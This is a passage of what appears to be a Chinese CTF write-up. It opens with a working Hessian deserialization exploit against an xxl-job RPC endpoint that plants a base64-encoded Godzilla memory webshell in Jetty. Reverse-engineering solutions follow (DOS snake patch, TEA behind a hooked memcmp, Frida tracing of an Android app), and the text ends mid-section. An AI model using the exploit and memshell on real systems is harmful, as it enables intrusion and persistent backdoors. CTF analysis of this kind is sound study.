luZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAB2RvRmluYWwBAAYoW0IpW0IBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAJZ2V0SGVhZGVyAQAQZXF1YWxzSWdub3JlQ2FzZQEAFShMamF2YS9sYW5nL1N0cmluZzspWgEAB2lzRW1wdHkBAAMoKVoBAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBACBvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvUmVxdWVzdAEACnNldEhhbmRsZWQBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAD2dldE91dHB1dFN0cmVhbQEAJSgpTGphdmF4L3NlcnZsZXQvU2VydmxldE91dHB1dFN0cmVhbTsBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW0BAAV3cml0ZQEABShbQilWAQAFZmx1c2gBAAxnZXRQYXJhbWV0ZXIBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQApKFtMamF2YS9uZXQvVVJMO0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvQnl0ZUFycmF5AQAOZ2V0SHR0cENoYW5uZWwBACgoKUxvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvSHR0cENoYW5uZWw7AQAkb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL0h0dHBDaGFubmVsAQAJZ2V0U2VydmVyAQAjKClMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL1NlcnZlcjsBAB9vcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvU2VydmVyAQAKZ2V0SGFuZGxlcgEAJCgpTG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IYW5kbGVyOwEAEWphdmEvbGFuZy9Cb29sZWFuAQAWKFopTGphdmEvbGFuZy9Cb29sZWFuOwEAA3NldAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgEAC2dldEhhbmRsZXJzAQAlKClbTG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IYW5kbGVyOwEAC3NldEhhbmRsZXJzAQAmKFtMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL0hhbmRsZXI7KVYBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQCAAIgAAAAEAAAAiQCKAAAAAACLAIoAAAAAAIwAigAAAAAAjQCOAAAACgAJAIwAjwABAJAAAACnAAQAAwAAADABTBIBuAACTSwqtgADAyq2AAS2AAW7AAZZBCy2AAe3AAgQELYACbYACkynAARNK7AAAQACACoALQALAAMAkQAAAB4ABwAAAB4AAg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";
        String xslt = xsltTemplate.replace("<base64_payload>", base64Code).replace("<class_name>", "com.xxl.job.core.JettyGodzillaMemshell");
        SwingLazyValue swingLazyValue = new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{"/tmp/aaa.xslt", xslt.getBytes()});
        SwingLazyValue swingLazyValue1 = new SwingLazyValue("com.sun.org.apache.xalan.internal.xslt.Process", "_main", new Object[]{new String[]{"-XT", "-XSL", "/tmp/aaa.xslt"}});

        Object[] keyValueList = new Object[]{"abc", swingLazyValue};
        Object[] keyValueList1 = new Object[]{"ccc", swingLazyValue1};
        UIDefaults uiDefaults1 = new UIDefaults(keyValueList);
        UIDefaults uiDefaults2 = new UIDefaults(keyValueList);
        UIDefaults uiDefaults3 = new UIDefaults(keyValueList1);
        UIDefaults uiDefaults4 = new UIDefaults(keyValueList1);
        Hashtable<Object, Object> hashtable1 = new Hashtable<>();
        Hashtable<Object, Object> hashtable2 = new Hashtable<>();
        Hashtable<Object, Object> hashtable3 = new Hashtable<>();
        Hashtable<Object, Object> hashtable4 = new Hashtable<>();
        hashtable1.put("a", uiDefaults1);
        hashtable2.put("a", uiDefaults2);
        hashtable3.put("b", uiDefaults3);
        hashtable4.put("b", uiDefaults4);
        Object gettable = hessian_demo_main.gettable(hashtable1, hashtable2, hashtable3, hashtable4);
        HessianSerializer serializer = new HessianSerializer();
//        byte[] data = serializer.serialize(xxlRpcRequest);
        ByteArrayOutputStream os = new ByteArrayOutputStream();
        Hessian2Output ho = new Hessian2Output(os);
        byte[] var5;
        SerializerFactory serializerFactory = ho.getSerializerFactory();
        serializerFactory.setAllowNonSerializable(true);
        ho.setSerializerFactory(serializerFactory);
        ho.writeObject(gettable);
        ho.flush();
        byte[] result = os.toByteArray();
        var5 = result;
        String shellcode = sendPostRequest("http://127.0.0.1:21000/run", var5);
        System.out.println(shellcode);

    }
}

```

最终哥斯拉直接x-fuck-data:godzilla就可以连接哥斯拉了。

# REVERSE
## 题目：<font style="color:rgb(33, 37, 41);">DosSnake</font>
解题步骤

1. 汇编语言分析  
反编译之后发现是很长的汇编语言  
并且发现是dos系统的程序，使用DOSbox运行之后发现是一个贪吃蛇小游戏，那么我们只需要找到长度比较点就可以了
2. 长度比较点分析

```plain
 83 C6 02                      add     si, 2
seg002:011A 8B CE                         mov     cx, si
seg002:011C 83 E9 04                      sub     cx, 4
seg002:011F D1 E9                         shr     cx, 1
seg002:0121 83 F9 58                      cmp     cx, 88
seg002:0124 75 03                         jnz     short loc_104A9
```

最后发现此处长度比较，我们将他改为5然后运行程序玩一下就可以得到flag

1. 逻辑解密

```plain
         mov     cx, 20h ; ' '
seg002:025F 8D 36 2A 03                   lea     si, aDasctf+6                   ; ""
seg002:0263 8D 3E 24 03                   lea     di, aDasctf                     ; "DASCTF"
seg002:0263
seg002:0267
seg002:0267                               loc_105E7:                              ; CODE XREF: sub_105DC:loc_105F9↓j
seg002:0267 8A 04                         mov     al, [si]
seg002:0269 32 05                         xor     al, [di]
seg002:026B 88 04                         mov     [si], al
seg002:026D 46                            inc     si
seg002:026E 47                            inc     di
seg002:026F 81 FF 2A 03                   cmp     di, 32Ah
seg002:0273 75 04                         jnz     short loc_105F9
```

可以发现是  
DASCTF  
与unsigned char ida_chars[] ={    0,   0,   0,   0,   0,  63,   9,  99,  52,  50,    19,  42,  47,  42,  55,  60,  35,   0,  46,  32,    16,  58,  39,  47,  36,  58,  48, 117, 103, 101,    60,   0,   0,   0,   0,   0,   0};  
循环异或，异或回去则可以拿到flag



## 题目：<font style="color:rgb(33, 37, 41);">Strangeprograme</font>
解题步骤

1. IDA查看代码main函数如下：

```cpp
int sub_4153E0()
{
  int v0; // eax

  sub_4114D8(&unk_4250F3);
  v0 = sub_41126C(std::cout, "Please input flag");
  std::ostream::operator<<(v0, &sub_411055);
  sub_411384();
  sub_4115AA(std::cin, &unk_422580);
  if ( !j_memcmp(&unk_422580, aDasctfIAmFakeB, 0x100u) )
    puts("Right!");
  else
    puts("Wrong!");
  sub_411384();
  return 0;
}
```

发现就一个memcmp，比较了一个fake flag  
DASCTF{I'am Fake But Why Look Like real?}显然是假的  
那么可以肯定的就是memcmp被动了手脚  
那么我们使用附加调试，在memcmp上下断点，就可以发现memcmp的IAT表被修改了，属于IATHOOK

1. Memcmp内容分析：  
附加调试之后找到的memcmp真正的逻辑如下：

```cpp
__int64 __cdecl sub_41D250(char *Str)
{
  __int64 v1; // rax
  __int64 v3; // [esp-8h] [ebp-24Ch]
  int j; // [esp+D0h] [ebp-174h]
  size_t i; // [esp+F4h] [ebp-150h]
  char *v6; // [esp+100h] [ebp-144h]
  int v7; // [esp+124h] [ebp-120h] BYREF
  int v8; // [esp+128h] [ebp-11Ch]
  int v9; // [esp+12Ch] [ebp-118h]
  int v10; // [esp+130h] [ebp-114h]
  char v11[260]; // [esp+13Ch] [ebp-108h] BYREF
  int savedregs; // [esp+244h] [ebp+0h] BYREF

  sub_4114D8(&unk_4250F3);
  v11[0] = -7;
  v11[1] = 77;
  v11[2] = 43;
  v11[3] = -68;
  v11[4] = 19;
  v11[5] = -35;
  v11[6] = 19;
  v11[7] = 98;
  v11[8] = -55;
  v11[9] = -4;
  v11[10] = -1;
  v11[11] = -119;
  v11[12] = 125;
  v11[13] = 79;
  v11[14] = -55;
  v11[15] = 15;
  v11[16] = 99;
  v11[17] = 29;
  v11[18] = 109;
  v11[19] = 82;
  v11[20] = 80;
  v11[21] = -3;
  v11[22] = 65;
  v11[23] = -29;
  v11[24] = 51;
  v11[25] = 118;
  v11[26] = 40;
  v11[27] = -105;
  v11[28] = 56;
  v11[29] = 54;
  v11[30] = -7;
  v11[31] = 107;
  v11[32] = -112;
  v11[33] = 57;
  v11[34] = 20;
  v11[35] = -125;
  v11[36] = 44;
  v11[37] = -30;
  v11[38] = 44;
  v11[39] = 31;
  memset(&v11[40], 0, 216);
  v7 = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  if ( j_strlen(Str) == 40 )
  {
    v6 = Str + 4;
    v7 = *Str;
    v8 = *(Str + 1);
    sub_411541(&v7, &unk_422100);
    *Str = v7;
    *(Str + 1) = v8;
    for ( i = 2; i < j_strlen(Str) >> 2; i += 2 )
    {
      sub_411541(&v7, &unk_422100);
      *Str = v7;
      *v6 = v8;
      *&Str[4 * i] ^= *Str;
      *&Str[4 * i + 4] ^= *v6;
    }
    for ( j = 0; j < 40; ++j )
    {
      HIDWORD(v1) = j;
      if ( Str[j] != v11[j] )
      {
        LODWORD(v1) = 1;
        goto LABEL_12;
      }
    }
    LODWORD(v1) = 0;
  }
  else
  {
    LODWORD(v1) = 1;
  }
LABEL_12:
  v3 = v1;
  sub_41130C(&savedregs, &unk_41D5CC);
  return v3;
}
```

```cpp
int __cdecl sub_41D6F0(unsigned int *a1, _DWORD *a2)
{
  int result; // eax
  unsigned int i; // [esp+DCh] [ebp-2Ch]
  int v4; // [esp+E8h] [ebp-20h]
  unsigned int v5; // [esp+F4h] [ebp-14h]
  unsigned int v6; // [esp+100h] [ebp-8h]

  sub_4114D8(&unk_4250F3);
  v6 = *a1;
  v5 = a1[1];
  v4 = 0;
  for ( i = 0; i < 0x10; ++i )
  {
    v6 += (a2[1] + (v5 >> 5)) ^ (v4 + v5) ^ (*a2 + 16 * v5);
    v5 += (a2[3] + (v6 >> 5)) ^ (v4 + v6) ^ (a2[2] + 16 * v6);
    v4 -= 1640531527;
  }
  *a1 = v6;
  result = 4;
  a1[1] = v5;
  return result;
}
```

发现主要逻辑是tea  
逻辑还原如下：

```cpp
#include<cstdio>
#include<cmath>
#include<map>
#include<vector>
#include<queue>
#include<stack>
#include<set>
#include<string>
#include<cstring>
#include<list>
#include<stdlib.h>
using namespace std;
typedef int status;
typedef int selemtype;

unsigned int Key[7] = {0x12345678, 0x09101112, 0x13141516, 0x15161718};



void tea_encrypt(uint32_t *v, uint32_t *k) {
    printf("%X %X\n",v[0],v[1]);
    uint32_t v0 = v[0], v1 = v[1], sum = 0, i;
    uint32_t delta = 0x61C88647;

    for (i = 0; i < 16; i++) {
        v0 += ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
        v1 += ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
        sum -= delta;
    }

    v[0] = v0;
    v[1] = v1;
}

unsigned char Cipher[256] = "asdasdasdsadsadsadasd";
unsigned int Tmp[4] = {0};
int main() {
    unsigned int *p1 = (unsigned int *)(Cipher);
    unsigned int *p2 = (unsigned int *)(Cipher + 4);
    printf("%s\n", Cipher);
    
    Tmp[0] = *p1, Tmp[1] = *p2;
    tea_encrypt(Tmp, Key);
    printf("%X %X\n", *p1, *p2);
    *p1 = Tmp[0];
    *p2 = Tmp[1];
    for (int i = 2 ; i < strlen((char*) Cipher) / 4 ; i += 2 ) {
        tea_encrypt(Tmp, Key);
        
        *p1 = Tmp[0];
        *p2 = Tmp[1];
//		printf("%X %X\n", *p1, *p2);
        unsigned int *p3 = (unsigned int *)(Cipher + i * 4);
        unsigned int *p4 = (unsigned int *)(Cipher + i * 4 + 4);
        *p3 ^= *p1;
        *p4 ^= *p2;
    };
    for (int i = 0 ; i < 40 ; i ++ ) {
        printf("0x%X,", Cipher[i]);
    }

}
```

1. 就可以写出相应的EXP：

```cpp
#include <cstdio>
#include <cstring>
#include <cstdint>
#include <iostream>

using namespace std;

unsigned int Key[6] = {0x12345678, 0x09101112, 0x13141516, 0x15161718};

void tea_decrypt(uint32_t *v, uint32_t *k) {
//	printf("%X %X\n",v[0],v[1]);
    uint32_t v0 = v[0], v1 = v[1], sum = 0, i;
    uint32_t delta = 0x61C88647;
    for (int i = 0 ; i < 16 ; i ++ ) sum -= 0x61C88647;
    for (i = 0; i < 16; i++) {
        sum += delta;
        v1 -= ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
        v0 -= ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);

    }

    v[0] = v0;
    v[1] = v1;
}



unsigned int Tmp[4] = {0};

int main() {
    unsigned char EncryptedCipher[45] = {
        0xF9, 0x4D, 0x2B, 0xBC, 0x13, 0xDD, 0x13, 0x62,
        0xC9, 0xFC, 0xFF, 0x89, 0x7D, 0x4F, 0xC9, 0x0F,
        0x63, 0x1D, 0x6D, 0x52, 0x50, 0xFD, 0x41, 0xE3,
        0x33, 0x76, 0x28, 0x97, 0x38, 0x36, 0xF9, 0x6B,
        0x90, 0x39, 0x14, 0x83, 0x2C, 0xE2, 0x2C, 0x1F, 0
    };
    unsigned int *p1 = (unsigned int *)(EncryptedCipher);
    unsigned int *p2 = (unsigned int *)(EncryptedCipher + 4);
    for (int i = 8 ; i >= 2 ; i -= 2) {

        unsigned int *p3 = (unsigned int *)(EncryptedCipher + i * 4);
        unsigned int *p4 = (unsigned int *)(EncryptedCipher + i * 4 + 4);
        *p3 ^= *p1;
        *p4 ^= *p2;
        puts((char*)EncryptedCipher);
        Tmp[0] = *p1, Tmp[1] = *p2;
        tea_decrypt(Tmp, Key);
        *p1 = Tmp[0], *p2 = Tmp[1];

    }
    Tmp[0] = *p1, Tmp[1] = *p2;
    tea_decrypt(Tmp, Key);
    *p1 = Tmp[0], *p2 = Tmp[1];
    puts((char*)EncryptedCipher);

}
 ~~~
```

## 题目：<font style="color:rgb(33, 37, 41);">BabyAndroid</font>
解题步骤

1. 初步分析  
首先运行APK正如描述所说是一个APK文件，一般这种，我们很难找代码，描述中说到过程序存在发包功能，那我们使用一下程序保存发现拦截到了如下数据包：

```cpp
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
charset: utf-8
User-Agent: Dalvik/2.1.0 (Linux; U; Android 11; M2004J7AC Build/RP1A.200720.011)
Host: yuanshen.com
Connection: close
Accept-Encoding: gzip, deflate
Content-Length: 49

data=5SxJF2QOBphluhtPmIZrD0iqGnYQc6tI1EFvcyrMo8g=
```



参数和Respoonse.txt中给出的一致，那么肯定是加密上传了，那么我们只需要打印java.net.HttpURLConnection;  okhttp3.Response；java.net.HttpURLConnection的调用栈，就可以看到蛛丝马迹HOOK代码:

```javascript
Java.perform(function() {
    // Hook URL.openConnection()
    var URL = Java.use("java.net.URL");
    URL.openConnection.overload().implementation = function() {
        console.log("URL.openConnection() called");
        var result = this.openConnection();
        printStackTrace();
        return result;
    };

    // Hook HttpURLConnection.connect()
    var HttpURLConnection = Java.use("java.net.HttpURLConnection");
    HttpURLConnection.connect.implementation = function() {
        console.log("HttpURLConnection.connect() called");
        printStackTrace();
        return this.connect();
    };

    // Hook HttpURLConnection.getOutputStream()
    HttpURLConnection.getOutputStream.implementation = function() {
        console.log("HttpURLConnection.getOutputStream() called");
        printStackTrace();
        return this.getOutputStream();
    };

    // Hook HttpURLConnection.getInputStream()
    HttpURLConnection.getInputStream.implementation = function() {
        console.log("HttpURLConnection.getInputStream() called");
        printStackTrace();
        return this.getInputStream();
    };



    function printStackTrace() {
        var stackTrace = Java.use("java.lang.Thread").currentThread().getStackTrace();
        console.log("Stack trace:");
        for (var i in stackTrace) {
            console.log(stackTrace[i].toString());
        }
    }

      // Hook okhttp3.OkHttpClient and related methods
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    var Call = Java.use("okhttp3.Call");
    var Request = Java.use("okhttp3.Request");
    var Response = Java.use("okhttp3.Response");

    // Hook OkHttpClient.newCall
    OkHttpClient.newCall.overload('okhttp3.Request').implementation = function(request) {
        console.log("OkHttpClient.newCall() called with request: " + request);
        printStackTrace();
        return this.newCall(request);
    };

    // Hook Call.execute
    Call.execute.implementation = function() {
        console.log("Call.execute() called");
        printStackTrace();
        return this.execute();
    };

    // Hook Response.body
    Response.body.implementation = function() {
        console.log("Response.body() called");
        printStackTrace();
        return this.body();
    };

});

```

发现如下调用栈：

```powershell
[M2004J7AC::NoteX ]-> URL.openConnection() called
Stack trace:
dalvik.system.VMStack.getThreadStackTrace(Native Method)
java.lang.Thread.getStackTrace(Thread.java:1736)
java.net.URL.openConnection(Native Method)
site.qifen.note.model.sendRequest.sendPost(sendRequest.java:19)
site.qifen.note.ui.NoteActivity$EncryptAndSendTask.doInBackground(NoteActivity.java:192)
site.qifen.note.ui.NoteActivity$EncryptAndSendTask.doInBackground(NoteActivity.java:174)
android.os.AsyncTask$3.call(AsyncTask.java:394)
java.util.concurrent.FutureTask.run(FutureTask.java:266)
android.os.AsyncTask$SerialExecutor$1.run(AsyncTask.java:305)
java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
java.lang.Thread.run(Thread.java:923)
[Ljava.lang.StackTraceElement;@31cb859
function p() {
    [native code]
}
```

1. 代码分析  
看完调用栈，我们发现，主要是在site.qifen.note.ui.NoteActivity，接下来我们就可以开始反编译了

```java
private class EncryptAndSendTask extends AsyncTask<String, Void, String> {
        private EncryptAndSendTask() {
        }

        /* JADX INFO: Access modifiers changed from: protected */
        @Override // android.os.AsyncTask
        public String doInBackground(String... params) {
            String contentText = params[0];
            try {
                byte[] dexData = NoteActivity.this.loadData("Sex.jpg");
                ByteBuffer dexBuffer = ByteBuffer.wrap(dexData);
                InMemoryDexClassLoader classLoader = null;
                if (Build.VERSION.SDK_INT >= 26) {
                    classLoader = new InMemoryDexClassLoader(dexBuffer, NoteActivity.this.getClassLoader());
                }
                Class<?> checkerClass = classLoader.loadClass("site.qifen.note.ui.Encrypto");
                Method checkMethod = checkerClass.getMethod("encrypt", String.class);
                NoteActivity.this.contentText_back = contentText;
                String cipher = (String) checkMethod.invoke(checkerClass.getDeclaredConstructor(new Class[0]).newInstance(new Object[0]), NoteActivity.this.sendInit(contentText));
                String response = sendRequest.sendPost("http://yuanshen.com/", "data=" + cipher);
                Log.d("JNITest", "Server Response: " + response);
                return cipher;
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        }

        /* JADX INFO: Access modifiers changed from: protected */
        @Override // android.os.AsyncTask
        public void onPostExecute(String cipher) {
            if (cipher != null) {
                String titleText = NoteActivity.this.noteWriteTitleEdit.getText().toString();
                String tagText = NoteActivity.this.noteWriteTagEdit.getText().toString();
                String date = new SimpleDateFormat(DatePattern.NORM_DATETIME_MINUTE_PATTERN).format(new Date());
                if (NoteActivity.this.note == null) {
                    NoteActivity.this.noteDao.insertNote(new Note(tagText, titleText, NoteActivity.this.contentText_back, date, false));
                    NoteUtil.toast("保存成功");
                    NoteActivity.this.finish();
                    return;
                }
                NoteActivity.this.note.setTitle(titleText);
                NoteActivity.this.note.setContent(NoteActivity.this.contentText_back);
                NoteActivity.this.note.setDate(date);
                NoteActivity.this.note.setTag(NoteActivity.this.contentText_back);
                NoteActivity.this.noteDao.updateNote(NoteActivity.this.note);
                NoteUtil.toast("修改成功");
                NoteActivity.this.finish();
                return;
            }
            NoteUtil.toast("加密失败");
        }
    }

```

根据调用栈我们定位到上面代码，可以发现他从Sex.jpg中加载了一个site.qifen.note.ui.Encrypto类，来加密从从Native层方法sendInit返回的字符串。既然这样，我们需要想办法得到Dex的内容  
直接Hook Loaddata

```javascript
